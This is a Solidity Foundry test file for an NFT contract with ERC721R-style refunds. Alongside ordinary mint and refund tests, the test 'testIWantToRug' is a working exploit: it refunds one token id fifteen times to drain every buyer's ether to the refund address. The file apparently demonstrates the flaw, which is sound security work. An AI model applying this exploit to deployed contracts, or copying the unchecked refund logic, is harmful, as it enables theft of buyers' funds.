// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "ds-test/test.sol";
import "forge-std/Vm.sol";
import "../WAGMI-ERC721R.sol";

interface CheatCodes {
    function deal(address who, uint256 newBalance) external;
    function prank(address) external;
    function startPrank(address) external;
    function stopPrank() external;
}

contract WAGMITest is DSTest {
    WAGMI private wagmi;

    Vm private vm = Vm(HEVM_ADDRESS);
    CheatCodes cheats = CheatCodes(HEVM_ADDRESS);

    address king = address(1);

    function setUp() public {
        wagmi = new WAGMI();

        wagmi.togglePublicSaleStatus();

        wagmi.setRefundAddress(king);


        cheats.deal(address(1), 5 ether);
        cheats.deal(address(2), 5 ether);
        cheats.deal(address(3), 5 ether);
        cheats.deal(address(4), 5 ether);
    }

    function testRefundAddress() public {
        assertEq(wagmi.refundAddress(), king);
    }

    function testMint() public {
        cheats.prank(tx.origin);
        wagmi.publicSaleMint{value: 0.1 ether}(1);
        assertEq(address(tx.origin).balance, 4.9 ether);
    } 

    function testGotRefundAndOwnToken() public {
        cheats.startPrank(tx.origin);
        wagmi.publicSaleMint{value: 1 ether}(10);
        assertEq(address(tx.origin).balance, 4 ether);


        uint256[] memory ids = new uint256[](1);
        ids[0] = 0;

        wagmi.refund(ids);
        assertEq(address(tx.origin).balance, 4.1 ether);

        assertEq(wagmi.ownerOf(0), king);

        cheats.stopPrank();   
    }

    function testRefund() public {
        cheats.startPrank(tx.origin);
        wagmi.publicSaleMint{value: 1 ether}(10);
        assertEq(king.balance, 4 ether);


        uint256[] memory ids = new uint256[](1);
        ids[0] = 0;

        wagmi.refund(ids);
        assertEq(king.balance, 4.1 ether);

        cheats.stopPrank();
    } 

    function testIWantToRug() public {
        cheats.prank(address(2));
        wagmi.publicSaleMint{value: 1 ether}(10);

        cheats.prank(address(3));
        wagmi.publicSaleMint{value: 0.3 ether}(3);

        cheats.prank(address(4));
        wagmi.publicSaleMint{value: 0.1 ether}(1);

        cheats.prank(king);
        wagmi.publicSaleMint{value: 0.1 ether}(1);
        assertEq(king.balance, 4.9 ether);

        assertEq(address(wagmi).balance, 1.5 ether);

        uint256[] memory ids = new uint256[](15);
        for(uint256 i = 0; i < 15; i++) {
            ids[i] = 14;
        }

        cheats.prank(king);
        wagmi.refund(ids);
        assertEq(king.balance, 6.4 ether);

        assertEq(address(wagmi).balance, 0 ether);
    }
}